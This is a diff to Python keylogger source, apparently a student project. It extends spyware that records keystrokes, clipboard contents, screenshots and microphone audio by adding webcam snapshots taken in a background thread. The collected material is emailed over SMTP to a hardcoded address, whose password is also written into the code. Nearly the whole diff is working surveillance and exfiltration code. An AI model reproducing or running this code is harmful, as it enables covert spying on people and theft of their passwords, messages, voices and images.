@@ -3,6 +3,8 @@ import smtplib # SMTP (Simple Mail Tranfer Protocol)
 import os
 import pyperclip
 import sounddevice
+import cv2
+import time
 from scipy.io.wavfile import write
 from threading import Timer, Thread
 from datetime import datetime
@@ -13,7 +15,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 #PARAMATERS
-INTERVAL = 20 # in seconds, 60 means 1 minute and so on
+INTERVAL = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "SomethingAwesome6441@outlook.com"
 EMAIL_PASSWORD = "ThisIsAStrongPassword"
 
@@ -124,16 +126,20 @@ class Keylogger:
             self.end_dt = datetime.now()
             # self.update_filename()
             # if self.report_method == "email":
-            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log, self.attachments, self.clipboard_history)
+            message = self.log
+            files = self.attachments
+            clipboard = self.clipboard_history
+            print(message, files, clipboard)
+            self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, message, files, clipboard)
             # elif self.report_method == "file":
             #     self.report_to_file()
             # if you don't want to print in the console, comment below line
             # print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
             #reset log and attachments
-            self.log = ""
-            self.attachments = []
-            self.clipboard_history = []
+            self.log = self.log[len(message):]
+            self.attachments = self.attachments[len(files):]
+            self.clipboard_history = self.clipboard_history[len(clipboard):]
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
         timer.daemon = True
@@ -141,25 +147,65 @@ class Keylogger:
         timer.start()
 
     def capture_img(self):
-        if not os.path.exists("file_attachments"):
-            os.mkdir("file_attachments") # make attachment directory in current directory
-        # capture screen shot
-        dt = f'{datetime.now()}'
-        img = ImageGrab.grab()
-        img_name = f'file_attachments/screenshot{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
-        self.attachments.append(img_name)
-        img.save(img_name)
+        # if not os.path.exists("file_attachments"):
+        #     os.mkdir("file_attachments") # make attachment directory in current directory
+        while True:
+            # capture screen shot
+            dt = f'{datetime.now()}'
+            img = ImageGrab.grab()
+            img_name = f'file_attachments/screenshot{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
+            img.save(img_name)
+            self.attachments.append(img_name)
 
-        # set interval for screen capture
-        if self.interval/2 > 5:
-            interval = 5
-        else:
+            # set interval for screen capture
             interval = self.interval/2
-        timer = Timer(interval=interval, function=self.capture_img)
-        # set the thread as daemon (dies when main thread die)
-        timer.daemon = True
-        # start the timer
-        timer.start()
+            if self.interval/2 > 5:
+                interval = 5
+            time.sleep(interval)
+        # timer = Timer(interval=interval, function=self.capture_img)
+        # # set the thread as daemon (dies when main thread die)
+        # timer.daemon = True
+        # # start the timer
+        # timer.start()
+    
+    def capture_webcam(self):
+        # duration = self.interval/2
+        # if self.interval/2 > 10:
+        #     duration = 10      
+        # fourcc = cv2.VideoWriter_fourcc(*'mp4v')      
+        while True:
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            if ret:
+                dt = f'{datetime.now()}'
+                web_cap_name = f'file_attachments/webcam{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
+                cv2.imwrite(web_cap_name, frame)
+            # out = cv2.VideoWriter(vid_name, fourcc, 20.0, (640, 480))
+            # start = time.time()
+            # while int(time.time() - start) < duration:
+            #     ret, frame = cap.read()
+            #     if not ret:
+            #         break
+            #     frame = cv2.flip(frame,1)
+            #     out.write(frame) 
+                self.attachments.append(web_cap_name)
+        #     cap.release()
+        # # # out.release()
+        #     cv2.destroyAllWindows()
+            # print("saved")      
+        # set interval for screen capture
+            # interval = self.interval/2
+            # if self.interval/2 > 5:
+            #     interval = 5
+            # time.sleep(interval)
+
+        # timer = Timer(interval=interval, function=self.capture_webcam)
+        # # set the thread as daemon (dies when main thread die)
+        # timer.daemon = True
+        # # start the timer
+        # timer.start()
+              
+
     
     def copy_clipboard(self):
         while True:
@@ -170,36 +216,58 @@ class Keylogger:
             # Sampling frequency
             freq = 44100
             # Recording duration
-            duration = 10
+            if self.interval/2 > 10:
+                duration = 10
+            else:
+                duration = self.interval/2
             dt = f'{datetime.now()}'
             recording_name = f'file_attachments/recording{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.wav'
             recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)
             sounddevice.wait()
             write(recording_name, freq, recording)
             self.attachments.append(recording_name)
+            time.sleep(duration)
 
     def start(self):
         # record the start datetime
         self.start_dt = datetime.now()
+        os.mkdir("file_attachments") # make attachment directory in current directory
         # start the keylogger
         keyboard.on_release(self.update_log)
+
         # start reporting the keylogs
         self.report()
+
         # start capturing clipboard
         clipboard_thread = Thread(target=self.copy_clipboard)
         # set the thread as daemon (dies when main thread die)
         clipboard_thread.daemon = True
         clipboard_thread.start()
+
         # start recording microphone audio
         microphone_thread = Thread(target=self.record_microphone)
         # set the thread as daemon (dies when main thread die)
         microphone_thread.daemon = True
         microphone_thread.start()
+
+
+        # start capturing webcam      
+        # self.capture_webcam()
+        webcam_thread = Thread(target=self.capture_webcam)
+        # set the thread as daemon (dies when main thread die)
+        webcam_thread.daemon = True
+        webcam_thread.start()
+
         # start capturing the screen
-        self.capture_img()
+        # self.capture_img()
+        img_thread = Thread(target=self.capture_img)
+        # set the thread as daemon (dies when main thread die)
+        img_thread.daemon = True
+        img_thread.start()
 
         # make a simple message
         print(f"{datetime.now()} - Started keylogger")
+
         # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
